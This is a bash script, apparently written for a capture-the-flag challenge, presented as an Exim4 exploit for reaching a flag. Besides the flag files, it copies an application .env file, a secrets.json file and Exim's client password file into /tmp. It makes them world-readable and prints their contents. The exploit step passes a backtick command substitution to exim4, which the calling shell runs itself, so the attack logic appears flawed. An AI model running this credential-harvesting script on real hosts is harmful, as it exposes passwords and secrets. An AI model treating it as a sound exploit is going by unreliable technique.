#!/bin/bash

echo "[+] Exploitation d'Exim4 pour accéder au flag"

# Créer un script simple pour copier le flag
cat > /tmp/copy_flag.sh << 'EOF'
#!/bin/bash
# Copier les fichiers potentiellement intéressants
cp /app/flag_3.txt /tmp/flag_3.txt 2>/dev/null
cp /app/flag.txt /tmp/flag.txt 2>/dev/null
cp /app/flag_3 /tmp/flag_3 2>/dev/null
cp /app/.env /tmp/env_file 2>/dev/null
cp /api/secrets.json /tmp/secrets.json 2>/dev/null
cp /etc/exim4/passwd.client /tmp/exim_passwd 2>/dev/null
cp /etc/exim4/exim4.conf.template /tmp/exim_conf 2>/dev/null
chmod 777 /tmp/flag* /tmp/env_file /tmp/secrets.json /tmp/exim* 2>/dev/null
ls -la /tmp/flag* /tmp/env_file /tmp/secrets.json /tmp/exim* 2>/dev/null
EOF

chmod +x /tmp/copy_flag.sh

echo "[+] Exécution de l'exploit..."
/usr/sbin/exim4 -C/dev/null -DEXIM_MACRO="`/tmp/copy_flag.sh`" > /tmp/exim_output.txt 2>&1

echo "[+] Résultats de l'exploitation:"
cat /tmp/exim_output.txt

echo "[+] Vérification des fichiers copiés:"
ls -la /tmp/flag* /tmp/env_file /tmp/secrets.json /tmp/exim* 2>/dev/null

echo "[+] Contenu des fichiers copiés:"
cat /tmp/flag* /tmp/env_file /tmp/secrets.json /tmp/exim* 2>/dev/null
